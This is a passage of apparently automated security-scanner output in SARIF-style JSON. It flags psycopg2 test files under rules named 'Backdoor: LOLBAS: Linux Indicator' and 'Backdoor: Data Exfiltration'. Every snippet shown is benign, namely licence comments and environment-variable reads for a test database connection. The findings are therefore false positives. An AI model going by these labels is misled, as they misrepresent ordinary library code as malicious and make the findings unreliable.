                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_dates.py"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 42,
                  "endLine": 14,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_transaction.py"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 22,
                  "endLine": 15,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_transaction.py"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 42,
                  "endLine": 14,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/testconfig.py"
                },
                "region": {
                  "startLine": 1,
                  "startColumn": 35,
                  "endLine": 1,
                  "endColumn": 40,
                  "snippet": {
                    "text": "# Configure the test suite from the env variables.\n\nimport os\n\n",
                    "rendered": {
                      "text": "# Configure the test suite from the env variables.\n\nimport os\n\n",
                      "markdown": "`# Configure the test suite from the env variables.\n\nimport os\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/testconfig.py"
                },
                "region": {
                  "startLine": 42,
                  "startColumn": 22,
                  "endLine": 42,
                  "endColumn": 27,
                  "snippet": {
                    "text": "if repl_dsn == '':\n    repl_dsn = dsn\n\nrepl_slot = os.environ.get('PSYCOPG2_TEST_REPL_SLOT', 'psycopg2_test_slot')\n",
                    "rendered": {
                      "text": "if repl_dsn == '':\n    repl_dsn = dsn\n\nrepl_slot = os.environ.get('PSYCOPG2_TEST_REPL_SLOT', 'psycopg2_test_slot')\n",
                      "markdown": "`if repl_dsn == '':\n    repl_dsn = dsn\n\nrepl_slot = os.environ.get('PSYCOPG2_TEST_REPL_SLOT', 'psycopg2_test_slot')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/testconfig.py"
                },
                "region": {
                  "startLine": 38,
                  "startColumn": 21,
                  "endLine": 38,
                  "endColumn": 26,
                  "snippet": {
                    "text": "\n# Don't run replication tests if REPL_DSN is not set, default to normal DSN if\n# set to empty string.\nrepl_dsn = os.environ.get('PSYCOPG2_TEST_REPL_DSN', None)\nif repl_dsn == '':\n    repl_dsn = dsn\n\n",
                    "rendered": {
                      "text": "\n# Don't run replication tests if REPL_DSN is not set, default to normal DSN if\n# set to empty string.\nrepl_dsn = os.environ.get('PSYCOPG2_TEST_REPL_DSN', None)\nif repl_dsn == '':\n    repl_dsn = dsn\n\n",
                      "markdown": "`\n# Don't run replication tests if REPL_DSN is not set, default to normal DSN if\n# set to empty string.\nrepl_dsn = os.environ.get('PSYCOPG2_TEST_REPL_DSN', None)\nif repl_dsn == '':\n    repl_dsn = dsn\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/testconfig.py"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 18,
                  "endLine": 12,
                  "endColumn": 23,
                  "snippet": {
                    "text": "dbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n# Check if we want to test psycopg's green path.\ngreen = os.environ.get('PSYCOPG2_TEST_GREEN', None)\nif green:\n    if green == '1':\n        from psycopg2.extras import wait_select as wait_callback\n",
                    "rendered": {
                      "text": "dbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n# Check if we want to test psycopg's green path.\ngreen = os.environ.get('PSYCOPG2_TEST_GREEN', None)\nif green:\n    if green == '1':\n        from psycopg2.extras import wait_select as wait_callback\n",
                      "markdown": "`dbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n# Check if we want to test psycopg's green path.\ngreen = os.environ.get('PSYCOPG2_TEST_GREEN', None)\nif green:\n    if green == '1':\n        from psycopg2.extras import wait_select as wait_callback\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/testconfig.py"
                },
                "region": {
                  "startLine": 9,
                  "startColumn": 62,
                  "endLine": 9,
                  "endColumn": 67,
                  "snippet": {
                    "text": "dbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n# Check if we want to test psycopg's green path.\ngreen = os.environ.get('PSYCOPG2_TEST_GREEN', None)\n",
                    "rendered": {
                      "text": "dbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n# Check if we want to test psycopg's green path.\ngreen = os.environ.get('PSYCOPG2_TEST_GREEN', None)\n",
                      "markdown": "`dbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n# Check if we want to test psycopg's green path.\ngreen = os.environ.get('PSYCOPG2_TEST_GREEN', None)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/testconfig.py"
                },
                "region": {
                  "startLine": 9,
                  "startColumn": 19,
                  "endLine": 9,
                  "endColumn": 24,
                  "snippet": {
                    "text": "dbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n# Check if we want to test psycopg's green path.\ngreen = os.environ.get('PSYCOPG2_TEST_GREEN', None)\n",
                    "rendered": {
                      "text": "dbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n# Check if we want to test psycopg's green path.\ngreen = os.environ.get('PSYCOPG2_TEST_GREEN', None)\n",
                      "markdown": "`dbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n# Check if we want to test psycopg's green path.\ngreen = os.environ.get('PSYCOPG2_TEST_GREEN', None)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/testconfig.py"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 58,
                  "endLine": 8,
                  "endColumn": 63,
                  "snippet": {
                    "text": "dbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n# Check if we want to test psycopg's green path.\n",
                    "rendered": {
                      "text": "dbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n# Check if we want to test psycopg's green path.\n",
                      "markdown": "`dbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n# Check if we want to test psycopg's green path.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/testconfig.py"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 19,
                  "endLine": 8,
                  "endColumn": 24,
                  "snippet": {
                    "text": "dbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n# Check if we want to test psycopg's green path.\n",
                    "rendered": {
                      "text": "dbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n# Check if we want to test psycopg's green path.\n",
                      "markdown": "`dbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n# Check if we want to test psycopg's green path.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/testconfig.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 58,
                  "endLine": 7,
                  "endColumn": 63,
                  "snippet": {
                    "text": "\ndbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n",
                    "rendered": {
                      "text": "\ndbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n",
                      "markdown": "`\ndbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/testconfig.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 19,
                  "endLine": 7,
                  "endColumn": 24,
                  "snippet": {
                    "text": "\ndbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n",
                    "rendered": {
                      "text": "\ndbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n",
                      "markdown": "`\ndbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/testconfig.py"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 58,
                  "endLine": 6,
                  "endColumn": 63,
                  "snippet": {
                    "text": "import os\n\ndbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n",
                    "rendered": {
                      "text": "import os\n\ndbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n",
                      "markdown": "`import os\n\ndbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/testconfig.py"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 19,
                  "endLine": 6,
                  "endColumn": 24,
                  "snippet": {
                    "text": "import os\n\ndbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n",
                    "rendered": {
                      "text": "import os\n\ndbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n",
                      "markdown": "`import os\n\ndbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/testconfig.py"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 19,
                  "endLine": 5,
                  "endColumn": 24,
                  "snippet": {
                    "text": "\nimport os\n\ndbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\n",
                    "rendered": {
                      "text": "\nimport os\n\ndbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\n",
                      "markdown": "`\nimport os\n\ndbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/testconfig.py"
                },
                "region": {
                  "startLine": 34,
                  "startColumn": 14,
                  "endLine": 34,
                  "endColumn": 22,
                  "snippet": {
                    "text": "if dbuser is not None:\n    dsn += f' user={dbuser}'\nif dbpass is not None:\n    dsn += f' password={dbpass}'\n\n# Don't run replication tests if REPL_DSN is not set, default to normal DSN if\n# set to empty string.\n",
                    "rendered": {
                      "text": "if dbuser is not None:\n    dsn += f' user={dbuser}'\nif dbpass is not None:\n    dsn += f' password={dbpass}'\n\n# Don't run replication tests if REPL_DSN is not set, default to normal DSN if\n# set to empty string.\n",
                      "markdown": "`if dbuser is not None:\n    dsn += f' user={dbuser}'\nif dbpass is not None:\n    dsn += f' password={dbpass}'\n\n# Don't run replication tests if REPL_DSN is not set, default to normal DSN if\n# set to empty string.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/testconfig.py"
                },
                "region": {
                  "startLine": 9,
                  "startColumn": 70,
                  "endLine": 9,
                  "endColumn": 78,
                  "snippet": {
